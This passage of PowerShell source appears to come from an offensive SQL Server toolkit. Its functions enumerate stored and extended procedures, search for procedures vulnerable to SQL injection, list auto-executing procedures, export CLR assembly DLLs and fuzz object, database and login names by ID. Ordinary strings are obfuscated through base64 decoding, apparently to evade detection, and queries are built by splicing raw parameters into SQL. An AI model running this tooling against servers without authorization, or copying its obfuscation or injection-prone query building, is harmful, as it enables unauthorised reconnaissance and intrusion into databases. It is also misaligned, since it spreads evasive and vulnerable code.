            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                $AutoExecFilter
                $ProcedureNameFilter
                $KeywordFilter"
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }
    End
    {
        $TblProcs
    }
}
Function  Get-SQLStoredProcedureXP
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblXpProcs = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }
            $Query = "  use [$DbName];
                SELECT '$ComputerName' as [ComputerName],
                    '$Instance' as [Instance],
                    '$DbName' as [DatabaseName],                
                    o.object_id,
		            o.parent_object_id,
		            o.schema_id,
		            o.type,
		            o.type_desc,
		            o.name,
		            o.principal_id,
		            s.text,
		            s.ctext,
		            s.status,
		            o.create_date,
		            o.modify_date,
		            o.is_ms_shipped,
		            o.is_published,
		            o.is_schema_published,
		            s.colid,
		            s.compressed,
		            s.encrypted,
		            s.id,
		            s.language,
		            s.number,
		            s.texttype
            FROM sys.objects o 
            INNER JOIN sys.syscomments s
		            ON o.object_id = s.id
            WHERE o.type = 'x' 
            $ProcedureNameFilter"
            $TblXpProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblXpProcs = $TblXpProcs + $TblXpProcsTemp
        }
    }
    End
    {
        $XpNum = $TblXpProcs.Count
        if($XpNum -eq 0){
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : No custom extended stored procedures found."
            }
        }
        $TblXpProcs
    }
}
Function  Get-SQLStoredProcedureSQLi
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for signed procedures.')]
        [switch]$OnlySigned,
        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblProcs = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }
        if ($AutoExec)
        {
            $AutoExecFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQAIAA9ACAAMQA=')))
        }
        else
        {
            $AutoExecFilter = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking databases below for vulnerable stored procedures:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - Checking $DbName database..."
            }
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1 AND               
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') 
                AND ROUTINE_DEFINITION like '%+%'
                AND ROUTINE_CATALOG not like 'msdb' 
                $AutoExecFilter                              
                $ProcedureNameFilter
                $KeywordFilter
                ORDER BY ROUTINE_NAME"
            if($OnlySigned){
                $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                spr.ROUTINE_CATALOG as DB_NAME,
                spr.SPECIFIC_SCHEMA as SCHEMA_NAME,
                spr.ROUTINE_NAME as SP_NAME,
                spr.ROUTINE_DEFINITION as SP_CODE,
                CASE cp.crypt_type
                when 'SPVC' then cer.name
                when 'CPVC' then Cer.name
                when 'SPVA' then ak.name
                when 'CPVA' then ak.name
                END as CERT_NAME,
                sp.name as CERT_LOGIN,
                sp.sid as CERT_SID
                FROM sys.crypt_properties cp
                JOIN sys.objects o ON cp.major_id = o.object_id
                LEFT JOIN sys.certificates cer ON cp.thumbprint = cer.thumbprint
                LEFT JOIN sys.asymmetric_keys ak ON cp.thumbprint = ak.thumbprint
                LEFT JOIN INFORMATION_SCHEMA.ROUTINES spr on spr.ROUTINE_NAME = o.name
                LEFT JOIN sys.server_principals sp on sp.sid = cer.sid
                WHERE o.type_desc = 'SQL_STORED_PROCEDURE'AND
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') AND
                ROUTINE_CATALOG not like 'msdb' AND 
                ROUTINE_DEFINITION like '%+%'"
            }
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblProcsCount = $TblProcsTemp.rows.count
            Write-Verbose "$Instance : - $TblProcsCount found in $DbName database"
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }
    End
    {
        $TblProcs
    }
}
Function  Get-SQLStoredProcedureAutoExec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblProcs = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking for autoexec stored procedures..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            $Query = "  use [master];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                AND is_auto_executed = 1
                $ProcedureNameFilter
                $KeywordFilter"
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            if(-not $TblProcsTemp){
            }
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }
    End
    {
        $TblProcs
    }
}
Function  Get-SQLAssemblyFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$AssemblyName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$ExportFolder,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblAssemblyFiles = New-Object -TypeName System.Data.DataTable
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AaQBkAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AbgBhAG0AZQA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAGkAZAA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAG4AYQBtAGUA'))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBsAHIAXwBuAGEAbQBlAA=='))))        
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AdABlAG4AdAA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABlAHIAbQBpAHMAcwBpAG8AbgBfAHMAZQB0AF8AZABlAHMAYwA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBkAGEAdABlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AdQBzAGUAcgBfAGQAZQBmAGkAbgBlAGQA'))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        if($AssemblyName){
            $AssemblyNameQuery = "WHERE af.name LIKE '%$AssemblyName%'"
        }else{
            $AssemblyNameQuery = ""
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing assembly file information from $DbName."
            }
            $Query = "USE $DbName;
                      SELECT af.assembly_id,
 					  a.name as assembly_name,
                      af.file_id,					  	
					  af.name as file_name,
                      a.clr_name,
                      af.content, 
                      a.permission_set_desc,
                      a.create_date,
                      a.modify_date,
                      a.is_user_defined
                      FROM sys.assemblies a INNER JOIN sys.assembly_files af ON a.assembly_id = af.assembly_id 
                      $AssemblyNameQuery"
            $TblAssemblyFilesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblAssemblyFilesTemp |
            % -Process {
                $null = $TblAssemblyFiles.Rows.Add(
                    [string]$ComputerName,
                    [string]$Instance,
                    [string]$DbName,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.content,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.is_user_defined)
                if($ExportFolder){
                    $ExportOutputFolder = "$ExportFolder\CLRExports"
                    If ((test-path $ExportOutputFolder) -eq $False){
                        Write-Verbose "$instance : Creating export folder: $ExportOutputFolder"
                        $null = ni -Path "$ExportOutputFolder" -type directory
                    }  
                    $InstanceClean = $Instance -replace('\\','_')
                    $ServerPath = "$ExportOutputFolder\$InstanceClean"
                    If ((test-path $Serverpath) -eq $False){
                        Write-Verbose "$instance : Creating server folder: $ServerPath"
                        $null = ni -Path "$ServerPath" -type directory
                    }                   
                    $Databasepath = "$ServerPath\$DbName"
                    If ((test-path $Databasepath) -eq $False){
                        Write-Verbose "$instance : Creating database folder: $Databasepath"
                        $null = ni $Databasepath -type directory
                    } 
                    $CLRFilename = $_.file_name
                    Write-Verbose "$instance : - Exporting $CLRFilename.dll"
                    $FullExportPath = "$Databasepath\$CLRFilename.dll"
                    $_.content | sc -Encoding Byte $FullExportPath
                }                     
            }
        }
    }
    End
    {
        $TblAssemblyFiles
    }
}
Function  Get-SQLFuzzObjectName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblFuzzedObjects = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating objects from object IDs..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $StartId..$EndId |
        % -Process {
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [ObjectId],
            OBJECT_NAME($_) as [ObjectName]"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $ObjectName = $TblResults.ObjectName
            if( -not $SuppressVerbose)
            {
                if($ObjectName.length -ge 2)
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: $ObjectName"
                }
                else
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: "
                }
            }
            $TblFuzzedObjects = $TblFuzzedObjects + $TblResults
        }
    }
    End
    {
        $TblFuzzedObjects | ? -FilterScript {
            $_.ObjectName.length -ge 2
        }
    }
}
Function  Get-SQLFuzzDatabaseName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblFuzzedDbs = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating database names from database IDs..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $StartId..$EndId |
        % -Process {
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [DatabaseId],
            DB_NAME($_) as [DatabaseName]"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $DatabaseName = $TblResults.DatabaseName
            if($DatabaseName.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to: $DatabaseName"
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to:"
                }
            }
            $TblFuzzedDbs = $TblFuzzedDbs + $TblResults
        }
    }
    End
    {
        $TblFuzzedDbs | ? -FilterScript {
            $_.DatabaseName.length -ge 2
        }
    }
}
Function  Get-SQLFuzzServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Try to determine if the principal type is role, SQL login, or Windows account via error analysis of sp_defaultdb.')]
        [switch]$GetPrincipalType,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblFuzzedLogins = New-Object -TypeName System.Data.DataTable
        $null = $TblFuzzedLogins.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblFuzzedLogins.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblFuzzedLogins.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAA=='))))
